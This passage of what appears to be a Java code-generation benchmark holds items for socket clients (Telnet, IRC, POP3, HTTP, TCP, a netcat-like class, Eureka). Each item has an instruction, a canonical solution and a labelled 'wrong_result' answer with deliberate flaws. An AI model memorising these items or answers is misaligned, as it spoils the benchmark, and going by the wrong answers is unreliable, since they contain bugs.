    "wrong_result": "public class TelnetTransport {\n    private Socket socket;\n    private InputStream is;\n    private OutputStream os;\n    private boolean connected;\n\n    public void connect(String hostname, int port) throws IOException {\n        if (connected) {\n            close();\n        }\n        try {\n            tryAllAddresses(hostname, port);\n        } catch (SocketTimeoutException e) {\n            throw new IOException(\"Connection failed after trying all addresses\", e);\n        }\n        connected = true;\n        is = socket.getInputStream();\n        os = socket.getOutputStream();\n    }\n\n    private void tryAllAddresses(String host, int port) throws SocketTimeoutException {\n        InetAddress[] addresses = InetAddress.getAllByName(host);\n        for (InetAddress address : addresses) {\n            try {\n                socket = new Socket();\n                socket.connect(new InetSocketAddress(address, port), 5000);\n                return;\n            } catch (IOException e) {\n                // Continue to next address\n            }\n        }\n        throw new SocketTimeoutException(\"All addresses failed\");\n    }\n\n    public void close() {\n        if (connected) {\n            try {\n                if (socket != null) {\n                    socket.close();\n                }\n                if (is != null) {\n                    is.close();\n                }\n                if (os != null) {\n                    os.close();\n                }\n            } catch (IOException e) {\n                // Handle or log\n            }\n            connected = false;\n        }\n    }\n\n    public void flush() throws IOException {\n        os.flush();\n    }\n\n    public boolean isConnected() {\n        return connected;\n    }\n\n    public int read(byte[] buffer, int start, int len) throws IOException {\n        if (!connected) {\n            throw new IOException(\"Not connected\");\n        }\n        return is.read(buffer, start, len);\n    }\n\n    public void write(byte[] buffer) throws IOException {\n        if (!connected) {\n            throw new IOException(\"Not connected\");\n        }\n        os.write(buffer);\n    }\n\n    public void write(int c) throws IOException {\n        if (!connected) {\n            throw new IOException(\"Not connected\");\n        }\n        os.write(c);\n    }\n}"
  },
  {
    "Task_id": 569,
    "Instruction": "Task Description: Create a Java class that implements an IRC client connection using TCP sockets, with built-in monitoring capabilities through Stetho for network event reporting.\n\nClass Description: The IRCClientConnection class establishes and manages a connection to an IRC server, handles message sending/receiving, and provides monitoring hooks for network events. It implements Closeable for proper resource cleanup.\n\nAttributes:\n- mReporter: [StethoReporter] - Handles network event reporting to Stetho\n- mSocket: [Socket] - The TCP socket connection to the IRC server\n- mInput: [BufferedReader] - Stream for reading incoming messages\n- mOutput: [BufferedWriter] - Stream for sending outgoing messages\n\nMethods:\n- connect: [String host, int port] -> [IRCClientConnection] - Static factory method that establishes a connection to the specified IRC server\n- read: [] -> [String] - Reads a line from the server input stream and handles PING/PONG protocol\n- send: [String message] -> [void] - Sends a message to the server\n- maybeHandleIncomingMessage: [String message] -> [boolean] - Handles protocol-specific messages (like PING)\n- close: [] -> [void] - Closes all connection resources (implements Closeable)\n- StethoReporter (inner class): [] -> [] - Handles all Stetho-specific network event reporting",
    "Canonical_solution": "import com.facebook.stetho.inspector.network.NetworkEventReporter;\nimport com.facebook.stetho.inspector.network.NetworkEventReporterImpl;\nimport com.facebook.stetho.inspector.network.SimpleTextInspectorWebSocketFrame;\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport javax.annotation.Nullable;\n\npublic class IRCClientConnection implements Closeable {\n    private final StethoReporter mReporter;\n    private final Socket mSocket;\n    private final BufferedReader mInput;\n    private final BufferedWriter mOutput;\n\n    public static IRCClientConnection connect(String host, int port) throws IOException {\n        StethoReporter reporter = new StethoReporter();\n        Socket socket = new Socket();\n        reporter.onPreConnect(host, port);\n        try {\n            socket.connect(new InetSocketAddress(host, port));\n            reporter.onPostConnect();\n        } catch (IOException e) {\n            reporter.onError(e);\n            try {\n                socket.close();\n                throw e;\n            } finally {\n                reporter.onClosed();\n            }\n        }\n        return new IRCClientConnection(reporter, socket, \"UTF-8\");\n    }\n\n    private IRCClientConnection(StethoReporter reporter, Socket socket, String charset) throws IOException {\n        mReporter = reporter;\n        mSocket = socket;\n        mInput = new BufferedReader(new InputStreamReader(socket.getInputStream(), charset));\n        mOutput = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(), charset));\n    }\n\n    @Nullable\n    public String read() throws IOException {\n        try {\n            String message = mInput.readLine();\n            if (message != null) {\n                mReporter.onReceive(message);\n                maybeHandleIncomingMessage(message);\n            }\n            return message;\n        } catch (IOException e) {\n            mReporter.onError(e);\n            throw e;\n        }\n    }\n\n    public void send(String message) throws IOException {\n        mReporter.onSend(message);\n        try {\n            mOutput.write(message + \"\\r\\n\");\n            mOutput.flush();\n        } catch (IOException e) {\n            mReporter.onError(e);\n            throw e;\n        }\n    }\n\n    private boolean maybeHandleIncomingMessage(String message) throws IOException {\n        if (message.startsWith(\"PING \")) {\n            send(\"PONG \" + message.substring(\"PING \".length()));\n            return true;\n        }\n        return false;\n    }\n\n    public void close() throws IOException {\n        try {\n            try {\n                mOutput.close();\n            } catch (IOException e) {\n                mReporter.onError(e);\n                throw e;\n            }\n        } finally {\n            try {\n                mSocket.close();\n            } catch (IOException e) {\n                mReporter.onError(e);\n                throw e;\n            } finally {\n                mReporter.onClosed();\n            }\n        }\n    }\n\n    private static class StethoReporter {\n        private final NetworkEventReporter mReporter;\n        private final String mRequestId;\n\n        public StethoReporter() {\n            mReporter = NetworkEventReporterImpl.get();\n            mRequestId = mReporter.nextRequestId();\n        }\n\n        public void onPreConnect(String host, int port) {\n            mReporter.webSocketCreated(mRequestId, \"irc://\" + host + \":\" + port);\n        }\n\n        public void onPostConnect() {\n            // Sadly, nothing to report...\n        }\n\n        public void onError(IOException e) {\n            mReporter.webSocketFrameError(mRequestId, e.getMessage());\n        }\n\n        public void onClosed() {\n            mReporter.webSocketClosed(mRequestId);\n        }\n\n        public void onSend(String message) {\n            mReporter.webSocketFrameSent(new SimpleTextInspectorWebSocketFrame(mRequestId, message));\n        }\n\n        public void onReceive(String message) {\n            mReporter.webSocketFrameReceived(new SimpleTextInspectorWebSocketFrame(mRequestId, message));\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class IRCClientConnection implements Closeable {\n    private final StethoReporter mReporter;\n    private final Socket mSocket;\n    private final BufferedReader mInput;\n    private final BufferedWriter mOutput;\n\n    public static IRCClientConnection connect(String host, int port) throws IOException {\n        Socket socket = new Socket(host, port);\n        StethoReporter reporter = new StethoReporter();\n        BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        BufferedWriter output = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n        return new IRCClientConnection(reporter, socket, input, output);\n    }\n\n    private IRCClientConnection(StethoReporter reporter, Socket socket, BufferedReader input, BufferedWriter output) {\n        mReporter = reporter;\n        mSocket = socket;\n        mInput = input;\n        mOutput = output;\n    }\n\n    public String read() throws IOException {\n        String line = mInput.readLine();\n        if (line != null) {\n            mReporter.reportReceive(line);\n        }\n        return line;\n    }\n\n    public void send(String message) throws IOException {\n        mOutput.write(message + \"\\r\\n\");\n        mOutput.flush();\n        mReporter.reportSend(message);\n    }\n\n    public boolean maybeHandleIncomingMessage(String message) {\n        if (message != null && message.startsWith(\"PING\")) {\n            String pongMessage = \"PONG \" + message.substring(5);\n            send(pongMessage);\n            mReporter.reportSend(pongMessage);\n            return true;\n        }\n        return false;\n    }\n\n    @Override\n    public void close() throws IOException {\n        mInput.close();\n        mOutput.close();\n        mSocket.close();\n        mReporter.reportDisconnect();\n    }\n\n    private static class StethoReporter {\n        public void reportConnect() {\n            // Stetho reporting logic for connection\n        }\n\n        public void reportDisconnect() {\n            // Stetho reporting logic for disconnection\n        }\n\n        public void reportReceive(String message) {\n            // Stetho reporting logic for received message\n        }\n\n        public void reportSend(String message) {\n            // Stetho reporting logic for sent message\n        }\n    }\n}"
  },
  {
    "Task_id": 57,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously to fetch data from a given URL and process the response as a JSON object.\n\nClass Description: HttpRequestHandler is a utility class that contains nested classes and methods for performing asynchronous HTTP requests. It uses Android's AsyncTask to perform network operations in the background and processes the response data.\n\nAttributes: None (This is a utility class with static methods and nested classes)\n\nMethods:\n\nMethod1: MyAsyncTaskgetNews(String... params) -> String - A nested AsyncTask class that performs HTTP GET requests in the background. It takes a URL as input, establishes a connection, reads the response, and publishes the progress for JSON processing.\n\nMethod2: ConvertInputToStringNoChange(InputStream inputStream) -> String - A static helper method that converts an InputStream into a String by reading all lines from the input stream and concatenating them.\n\nMethod Details:\n\nMyAsyncTaskgetNews:\n- Input Parameters: String... params (varargs where params[0] should be the URL string)\n- Return Type: String (though it primarily works through side effects)\n- Description: \n  1. Creates a URL object from the input string\n  2. Opens an HttpURLConnection with a 7-second timeout\n  3. Reads the input stream and converts it to a string\n  4. Publishes the result for JSON processing in onProgressUpdate\n  5. Disconnects the connection when done\n\nConvertInputToStringNoChange:\n- Input Parameters: InputStream inputStream (the stream to read from)\n- Return Type: String (the concatenated content of the stream)\n- Description:\n  1. Creates a BufferedReader from the InputStream\n  2. Reads all lines and concatenates them into a single string\n  3. Closes the input stream\n  4. Returns the concatenated string",
    "Canonical_solution": "import android.os.AsyncTask;\nimport org.json.JSONObject;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    NewsData = ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONObject json = new JSONObject(progress[0]);\n            } catch (Exception ex) {}\n        }\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) {\n        BufferedReader bureader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String linereultcal = \"\";\n\n        try {\n            while((line = bureader.readLine()) != null) {\n                linereultcal += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return linereultcal;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpRequestHandler {\n    public static class MyAsyncTask extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            String url = params[0];\n            try {\n                URL urlObj = new URL(url);\n                HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();\n                conn.setConnectTimeout(7000);\n                conn.setRequestMethod(\"GET\");\n                conn.connect();\n                InputStream inputStream = conn.getInputStream();\n                String result = ConvertInputToStringNoChange(inputStream);\n                publishProgress(result);\n                return result;\n            } catch (Exception e) {\n                e.printStackTrace();\n                return null;\n            } finally {\n                if (conn != null) {\n                    conn.disconnect();\n                }\n            }\n        }\n\n        @Override\n        protected void onProgressUpdate(String... values) {\n            // JSON processing logic here\n        }\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) {\n        StringBuilder sb = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        try {\n            while ((line = reader.readLine()) != null) {\n                sb.append(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (inputStream != null) {\n                    inputStream.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        return sb.toString();\n    }\n\n    public static MyAsyncTask getNews(String... params) {\n        return new MyAsyncTask().execute(params[0]);\n    }\n}"
  },
  {
    "Task_id": 570,
    "Instruction": "Task Description: Implement a POP3 client connection class in Java that handles socket communication with a POP3 server, including connection establishment, data transmission, and resource cleanup.\n\nClass Description: The Pop3Connection class provides functionality to connect to a POP3 server using TCP sockets, send and receive data through input/output streams, and manage the connection lifecycle.\n\nAttributes:\n- socket: Socket - The TCP socket used for communication with the server\n- in: BufferedInputStream - Input stream for reading data from the server\n- out: BufferedOutputStream - Output stream for writing data to the server\n\nMethods:\n- connect() -> Socket - Establishes a connection to the POP3 server by trying all available IP addresses for the host\n- connectToAddress(InetAddress address) -> Socket - Creates and connects a socket to a specific server address\n- open() -> void - Opens the connection by initializing socket and streams, throws MessagingException on failure\n- isOpen() -> boolean - Checks if the connection is currently active and valid\n- close() -> void - Closes all connection resources (socket and streams)\n- writeLine(String s) -> void - Writes a line of text to the server (appends CRLF)\n- readLine() -> String - Reads a line of text from the server (handles CRLF line endings)",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\nclass Pop3Connection {\n    private Socket socket;\n    private BufferedInputStream in;\n    private BufferedOutputStream out;\n\n    private Socket connect() throws IOException, UnknownHostException {\n        InetAddress[] inetAddresses = InetAddress.getAllByName(settings.getHost());\n        IOException connectException = null;\n        for (InetAddress address : inetAddresses) {\n            try {\n                return connectToAddress(address);\n            } catch (IOException e) {\n                connectException = e;\n            }\n        }\n        throw connectException != null ? connectException : new UnknownHostException();\n    }\n\n    private Socket connectToAddress(InetAddress address) throws IOException {\n        InetSocketAddress socketAddress = new InetSocketAddress(address, settings.getPort());\n        final Socket socket = new Socket();\n        socket.connect(socketAddress, SOCKET_CONNECT_TIMEOUT);\n        return socket;\n    }\n\n    void open() throws MessagingException {\n        try {\n            socket = connect();\n            in = new BufferedInputStream(socket.getInputStream(), 1024);\n            out = new BufferedOutputStream(socket.getOutputStream(), 512);\n            socket.setSoTimeout(SOCKET_READ_TIMEOUT);\n            if (!isOpen()) {\n                throw new MessagingException(\"Unable to connect socket\");\n            }\n        } catch (IOException ioe) {\n            close();\n            throw new MessagingException(\"Unable to open connection to POP server.\", ioe);\n        }\n    }\n\n    boolean isOpen() {\n        return (in != null && out != null && socket != null\n                && socket.isConnected() && !socket.isClosed());\n    }\n\n    void close() {\n        try {\n            in.close();\n        } catch (Exception e) {}\n        try {\n            out.close();\n        } catch (Exception e) {}\n        try {\n            socket.close();\n        } catch (Exception e) {}\n        in = null;\n        out = null;\n        socket = null;\n    }\n\n    private void writeLine(String s) throws IOException {\n        out.write(s.getBytes());\n        out.write('\\r');\n        out.write('\\n');\n        out.flush();\n    }\n\n    String readLine() throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int d = in.read();\n        if (d == -1) {\n            throw new IOException(\"End of stream reached while trying to read line.\");\n        }\n        do {\n            if (((char)d) == '\\r') {\n                continue;\n            } else if (((char)d) == '\\n') {\n                break;\n            } else {\n                sb.append((char)d);\n            }\n        } while ((d = in.read()) != -1);\n        return sb.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class Pop3Connection {\n    private String host;\n    private int port;\n    private Socket socket;\n    private BufferedInputStream in;\n    private BufferedOutputStream out;\n\n    public Pop3Connection(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public Socket connect() throws IOException, MessagingException {\n        InetAddress[] addresses = InetAddress.getAllByName(host);\n        for (InetAddress address : addresses) {\n            try {\n                return connectToAddress(address);\n            } catch (IOException e) {\n                // Try next address\n            }\n        }\n        throw new MessagingException(\"Failed to connect to POP3 server\");\n    }\n\n    private Socket connectToAddress(InetAddress address) throws IOException {\n        return new Socket(address, port);\n    }\n\n    public void open() throws IOException, MessagingException {\n        socket = connect();\n        try {\n            in = new BufferedInputStream(socket.getInputStream());\n            out = new BufferedOutputStream(socket.getOutputStream());\n        } catch (IOException e) {\n            close();\n            throw new MessagingException(\"Failed to initialize streams\", e);\n        }\n    }\n\n    public boolean isOpen() {\n        return socket != null && socket.isConnected() && !socket.isClosed();\n    }\n\n    public void close() {\n        try {\n            if (in != null) in.close();\n            if (out != null) out.close();\n            if (socket != null) socket.close();\n        } catch (IOException e) {\n            // Handle exception, perhaps log it\n        }\n    }\n\n    public void writeLine(String s) throws IOException {\n        out.write(s.getBytes(StandardCharsets.UTF_8));\n        out.write('\\r');\n        out.write('\\n');\n        out.flush();\n    }\n\n    public String readLine() throws IOException {\n        StringBuilder line = new StringBuilder();\n        int c;\n        while ((c = in.read()) != -1) {\n            if (c == '\\r') {\n                int next = in.read();\n                if (next == '\\n') {\n                    return line.toString();\n                } else {\n                    line.append('\\r');\n                }\n            } else if (c == '\\n') {\n                return line.toString();\n            } else {\n                line.append((char) c);\n            }\n        }\n        return line.toString();\n    }\n}"
  },
  {
    "Task_id": 571,
    "Instruction": "Task Description: Create a TCP client class that establishes a connection to a server, sends requests, receives responses, and manages the connection lifecycle.\n\nClass Description: TcpRequester is a TCP client implementation that handles communication with a server using sockets. It provides methods to start/stop the connection, send requests, and fetch responses. The class manages socket resources and includes error handling for network operations.\n\nAttributes:\n- sock: Socket - The socket instance used for TCP communication  \n- in: InputStream - Input stream for reading server responses  \n- out: OutputStream - Output stream for sending requests to the server  \n- dest: SocketAddress - The server address to connect to  \n- request: String - The initial request string  \n- passcode: String - Authentication passcode  \n- on_rsp: Consumer<ByteArray> - Callback for handling responses  \n\nMethods:\n- start(InetAddress bind_addr, long timeout, int ttl) -> T - Establishes a socket connection to the server with specified timeout and TTL  \n- stop() -> T - Closes the socket and releases all resources  \n- isRunning() -> boolean - Checks if the connection is active  \n- sendRequest(byte[] request) -> T - Sends a byte array request to the server  \n- fetchResponse() -> ByteArray - Reads and returns the server response as a ByteArray",
    "Canonical_solution": "import org.jgroups.util.ByteArray;\nimport org.jgroups.util.Util;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.function.Consumer;\n\nprotected class TcpRequester extends Requester {\n    protected Socket       sock;\n    protected InputStream  in;\n    protected OutputStream out;\n\n    protected TcpRequester(SocketAddress dest, String request, String passcode,\n                           Consumer<ByteArray> on_rsp) {\n        super(dest, request, passcode, on_rsp);\n    }\n\n    protected <T extends Requester> T start(InetAddress bind_addr, long timeout, int ttl) throws IOException {\n        sock=new Socket();\n        sock.setSoTimeout((int)timeout);\n        sock.bind(new InetSocketAddress(bind_addr, 0));\n        sock.connect(dest);\n        in=sock.getInputStream();\n        out=sock.getOutputStream();\n        return (T)this;\n    }\n\n    protected <T extends Requester> T stop() {\n        Util.close(sock,in,out);\n        return (T)this;\n    }\n\n    protected boolean isRunning() {\n        return sock != null && !sock.isClosed();\n    }\n\n    protected <T extends Requester> T sendRequest(byte[] request) throws IOException {\n        out.write(request);\n        out.write('\\n');\n        return (T)this;\n    }\n\n    protected ByteArray fetchResponse() {\n        byte[] buf=new byte[1024];\n        int    index=0;\n\n        for(;;) {\n            try {\n                int bytes_read=in.read(buf, index, buf.length - index);\n                if(bytes_read == -1) {\n                    if(index > 0)\n                        break;\n                    return null;\n                }\n                index+=bytes_read;\n                if(index >= buf.length) {\n                    byte[] tmp=new byte[buf.length + 1024];\n                    System.arraycopy(buf, 0, tmp, 0, index);\n                    buf=tmp;\n                }\n            }\n            catch(IOException e) {\n                break;\n            }\n        }\n        return new ByteArray(buf, 0, index);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class TcpRequester {\n    private Socket sock;\n    private InputStream in;\n    private OutputStream out;\n    private SocketAddress dest;\n    private String request;\n    private String passcode;\n    private Consumer<byte[]> on_rsp;\n\n    public TcpRequester(SocketAddress dest, String request, String passcode, Consumer<byte[]> on_rsp) {\n        this.dest = dest;\n        this.request = request;\n        this.passcode = passcode;\n        this.on_rsp = on_rsp;\n    }\n\n    public void start(InetAddress bind_addr, long timeout, int ttl) {\n        try {\n            sock = new Socket();\n            sock.bind(new InetSocketAddress(bind_addr, 0));\n            sock.connect(dest, (int) timeout);\n            sock.setSoTimeout((int) timeout);\n            sock.setTrafficClass(ttl);\n            in = sock.getInputStream();\n            out = sock.getOutputStream();\n            byte[] reqBytes = request.getBytes();\n            out.write(reqBytes);\n            out.flush();\n            byte[] passBytes = passcode.getBytes();\n            out.write(passBytes);\n            out.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        if (sock != null) {\n            try {\n                sock.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (in != null) {\n            try {\n                in.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (out != null) {\n            try {\n                out.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public boolean isRunning() {\n        return sock != null && sock.isConnected();\n    }\n\n    public void sendRequest(byte[] request) {\n        try {\n            out.write(request);\n            out.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public byte[] fetchResponse() {\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        ByteArrayOutputStream response = new ByteArrayOutputStream();\n        try {\n            while ((bytesRead = in.read(buffer)) != -1) {\n                response.write(buffer, 0, bytesRead);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        byte[] data = response.toByteArray();\n        if (on_rsp != null) {\n            on_rsp.accept(data);\n        }\n        return data;\n    }\n}"
  },
  {
    "Task_id": 572,
    "Instruction": "Task Description: Create a function that establishes a TCP client connection to a server, sends data from an input stream, and verifies the successful transmission of data.\n\nFunction Description: The function should establish a connection to a server using a Socket, send data from an input stream to the server via an output stream, and ensure the data was transmitted successfully. It should also handle resource cleanup and verify the progress of the transmission.\n\nInput: \n- uri: [URI] - The URI object containing the host and port of the server to connect to.\n- inputStream: [InputStream] - The input stream containing the data to be sent to the server.\n- parser: [Object] - An object that manages the start and stop of the parsing process (assumed to have start() and stop() methods).\n\nOutput: \n- bytes: [long] - The number of bytes successfully transmitted to the server.\n- The function also asserts that the socket is connected, the number of bytes transmitted is greater than 0, and the progress of the transmission matches the expected progress. \n\nNote: The function may throw IOException, InterruptedException, or URISyntaxException.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.net.URISyntaxException;\n\npublic void testNormal() throws IOException, InterruptedException, URISyntaxException {\n    parser.start();\n\n    Socket client = new Socket(uri.getHost(), uri.getPort());\n    assertTrue(\"Socket is connected\", client.isConnected());\n\n    InputStream inputStream = combineResource(Progresses.allFiles);\n    OutputStream outputStream = client.getOutputStream();\n\n    long bytes = ByteStreams.copy(inputStream, outputStream);\n\n    Thread.sleep(100);\n\n    client.close();\n    parser.stop();\n\n    assertThat(bytes, greaterThan(0L));\n    assertThat(progesses, equalTo(Progresses.allProgresses));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "public static long sendData(URI uri, InputStream inputStream, Object parser) throws IOException, InterruptedException, URISyntaxException {\n    if (uri == null) throw new URISyntaxException(\"URI is null\", \"uri\");\n    String host = uri.getHost();\n    int port = uri.getPort();\n    if (host == null || port == -1) throw new URISyntaxException(\"Invalid URI\", \"uri\");\n\n    Socket socket = null;\n    try {\n        socket = new Socket();\n        socket.connect(new InetSocketAddress(host, port), 5000);\n        if (!socket.isConnected()) {\n            throw new IOException(\"Failed to connect to server\");\n        }\n\n        parser.start();\n\n        long bytesSent = 0;\n        byte[] buffer = new byte[8192];\n        int bytesRead;\n        try (OutputStream outputStream = socket.getOutputStream();\n             InputStream is = inputStream) {\n            while ((bytesRead = is.read(buffer)) != -1) {\n                outputStream.write(buffer, 0, bytesRead);\n                bytesSent += bytesRead;\n            }\n            outputStream.flush();\n        }\n\n        parser.stop();\n\n        if (bytesSent <= 0) {\n            throw new IOException(\"No data was transmitted\");\n        }\n\n        return bytesSent;\n    } finally {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 573,
    "Instruction": "Task Description: Implement a TCP client class in Java that can establish a connection to a server, send and receive data, and properly close the connection.\n\nClass Description: The GaNetCat class provides functionality for TCP client-server communication. It encapsulates socket operations, including connection establishment, data transmission, and resource cleanup.\n\nAttributes:\n- socket: Socket - The underlying socket used for network communication\n- inputStream: InputStream - Stream for receiving data from the server\n- outputStream: OutputStream - Stream for sending data to the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port. Throws IOException if connection fails.\n- sendData(InputStream source) -> void - Reads data from the source InputStream and sends it to the server through the output stream. Throws IOException if transmission fails.\n- receiveData(OutputStream destination) -> void - Receives data from the server and writes it to the destination OutputStream. Stops when encountering EOF or 0x04 (EOT) character. Throws IOException if reception fails.\n- close() -> void - Closes all resources (input stream, output stream, and socket) quietly, suppressing any exceptions during closure.",
    "Canonical_solution": "import org.apache.commons.io.IOUtils;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\n\npublic class GaNetCat {\n\n    private Socket socket;\n    private InputStream inputStream;\n    private OutputStream outputStream;\n\n    public void connect(String host, int port) throws IOException {\n        socket = new Socket();\n        socket.connect(new InetSocketAddress(host, port));\n        inputStream = socket.getInputStream();\n        outputStream = socket.getOutputStream();\n    }\n\n    public void sendData(InputStream source) throws IOException {\n        byte[] dataArray = new byte[1024];\n        int length;\n        do {\n            length = source.read(dataArray);\n            if (length <= 0) {\n                break;\n            }\n            outputStream.write(dataArray, 0, length);\n            outputStream.flush();\n        } while (length > 0);\n    }\n\n    public void receiveData(OutputStream destination) throws IOException {\n        byte[] dataArray = new byte[1024];\n        int length;\n        do {\n            length = inputStream.read(dataArray);\n            if (length == 1 && dataArray[0] == 0x04) {\n                destination.flush();\n                break;\n            }\n            if (length <= 0) {\n                break;\n            }\n            destination.write(dataArray, 0, length);\n        } while (length > 0);\n    }\n\n    public void close() {\n        IOUtils.closeQuietly(inputStream);\n        IOUtils.closeQuietly(outputStream);\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            // ignore\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class GaNetCat {\n    private Socket socket;\n    private InputStream inputStream;\n    private OutputStream outputStream;\n\n    public void connect(String host, int port) throws IOException {\n        socket = new Socket(host, port);\n        inputStream = socket.getInputStream();\n        outputStream = socket.getOutputStream();\n    }\n\n    public void sendData(InputStream source) throws IOException {\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = source.read(buffer)) != -1) {\n            outputStream.write(buffer, 0, bytesRead);\n        }\n    }\n\n    public void receiveData(OutputStream destination) throws IOException {\n        int byteRead;\n        while ((byteRead = inputStream.read()) != -1) {\n            if (byteRead == 0x04) {\n                break;\n            }\n            destination.write(byteRead);\n        }\n    }\n\n    public void close() {\n        try {\n            if (inputStream != null) {\n                inputStream.close();\n            }\n        } catch (IOException e) {\n        }\n        try {\n            if (outputStream != null) {\n                outputStream.close();\n            }\n        } catch (IOException e) {\n        }\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n        }\n    }\n}"
  },
  {
    "Task_id": 574,
    "Instruction": "Task Description: Create a function that establishes a TCP client connection to a service discovered via Eureka, sends a request, and processes the response.\n\nFunction Description: The function uses Eureka client to discover a service instance, establishes a socket connection to the discovered service, sends a formatted request string, and reads the response. It handles connection errors and IO exceptions appropriately.\n\nInput: \n- eurekaClient: EurekaClient - The Eureka client instance used for service discovery\n- (implicit) vipAddress: String - The virtual IP address of the service to discover (\"sampleservice.mydomain.net\")\n\nOutput: \n- void - The function doesn't return a value but prints the server response or error messages to standard output/error\n- Side effect: Establishes a network connection and communicates with the discovered service\n\nNote: The function includes error handling for service discovery failures, connection issues, and IO operations. The request string is dynamically generated with a timestamp.",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.io.IOException;\n\npublic void sendRequestToServiceUsingEureka(EurekaClient eurekaClient) {\n    String vipAddress = \"sampleservice.mydomain.net\";\n\n    InstanceInfo nextServerInfo = null;\n    try {\n        nextServerInfo = eurekaClient.getNextServerFromEureka(vipAddress, false);\n    } catch (Exception e) {\n        System.err.println(\"Cannot get an instance of example service to talk to from eureka\");\n        System.exit(-1);\n    }\n\n    Socket s = new Socket();\n    int serverPort = nextServerInfo.getPort();\n    try {\n        s.connect(new InetSocketAddress(nextServerInfo.getHostName(), serverPort));\n    } catch (IOException e) {\n        System.err.println(\"Could not connect to the server :\"\n                + nextServerInfo.getHostName() + \" at port \" + serverPort);\n    } catch (Exception e) {\n        System.err.println(\"Could not connect to the server :\"\n                + nextServerInfo.getHostName() + \" at port \" + serverPort + \"due to Exception \" + e);\n    }\n    try {\n        String request = \"FOO \" + new Date();\n\n        PrintStream out = new PrintStream(s.getOutputStream());\n        out.println(request);\n\n        BufferedReader rd = new BufferedReader(new InputStreamReader(s.getInputStream()));\n        String str = rd.readLine();\n        if (str != null) {\n            System.out.println(\"Received response from server: \" + str);\n        }\n        rd.close();\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
